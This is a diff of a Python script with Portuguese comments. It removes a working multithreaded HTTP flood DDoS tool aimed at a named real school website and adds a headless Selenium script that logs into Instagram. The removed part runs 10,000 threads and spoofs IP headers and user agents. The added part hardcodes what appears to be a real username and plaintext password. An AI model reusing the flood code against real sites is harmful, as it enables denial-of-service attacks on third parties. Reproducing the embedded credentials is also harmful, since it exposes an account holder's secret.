@@ -1,69 +1,36 @@
-import threading
-import requests
-import random
-import string
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+import time
 
-url = 'https://ecoescolas.abaae.pt/'  # URL do alvo
-num_threads = 10000  # Número de threads para enviar requisições
-num_requests = 1000000  # Número total de requisições a serem enviadas
+# Inicializar o navegador em modo headless
+options = webdriver.ChromeOptions()
+options.add_argument('--headless')  # Executar em modo headless, sem interface gráfica
+options.add_argument('--disable-gpu')  # Necessário para Chrome em Linux
+driver = webdriver.Chrome(options=options)
 
-def generate_random_string(length):
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+# Abrir o Instagram
+driver.get("https://www.instagram.com/")
 
-def load_user_agents(file_path):
-    with open(file_path, 'r') as file:
-        return file.read().splitlines()
+# Esperar um momento para garantir que a página seja carregada completamente
+time.sleep(4)
 
-def load_referers(file_path):
-    with open(file_path, 'r') as file:
-        return file.read().splitlines()
+# Encontrar os campos de login e senha e preenchê-los
+username_field = driver.find_element_by_name('username')
+password_field = driver.find_element_by_name('password')
+username_field.send_keys('seyzalel')
+password_field.send_keys('Sey17zalel17@$')
 
-user_agents = load_user_agents('useragents.txt')
-referers = load_referers('referers.txt')
+# Enviar o formulário de login
+password_field.send_keys(Keys.RETURN)
 
-def ddos_attack():
-    global num_requests
-    user_agent = random.choice(user_agents)
-    referer = random.choice(referers)
-    headers = {
-        'User-Agent': user_agent,
-        'Referer': referer,
-        'Authorization': 'Bearer ' + generate_random_string(50),
-        'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4)),
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Cache-Control': 'no-cache',
-        'Pragma': 'no-cache',
-        'Connection': 'keep-alive',
-        'Upgrade-Insecure-Requests': '1',
-        'DNT': '1',
-        'If-None-Match': 'W/"359670651"',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-        'Sec-Fetch-Site': 'same-origin',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-User': '?1',
-        'Sec-Fetch-Dest': 'document',
-        'Origin': 'https://example.com',
-        'TE': 'Trailers'
-    }
-    while num_requests > 0:
-        try:
-            # Aqui podemos encapsular o tráfego malicioso em um protocolo legítimo, como HTTPS
-            response = requests.get(url, headers=headers, timeout=1, verify=False)
-            print(f'Status code: {response.status_code}')
-        except requests.exceptions.RequestException as e:
-            print(f'Error: {e}')
-        num_requests -= 1
+# Esperar um pouco para o login ser processado
+time.sleep(7)
 
-# Inicia os threads
-threads = []
-for _ in range(num_threads):
-    thread = threading.Thread(target=ddos_attack)
-    thread.start()
-    threads.append(thread)
+# Verificar se o login foi bem sucedido
+if "feed" in driver.current_url:
+    print("Login bem sucedido!")
+else:
+    print("Login falhou.")
 
-# Espera todos os threads terminarem
-for thread in threads:
-    thread.join()
-
-print('HTTP Flood DDoS attack finished.')
+# Fechar o navegador
+driver.quit()
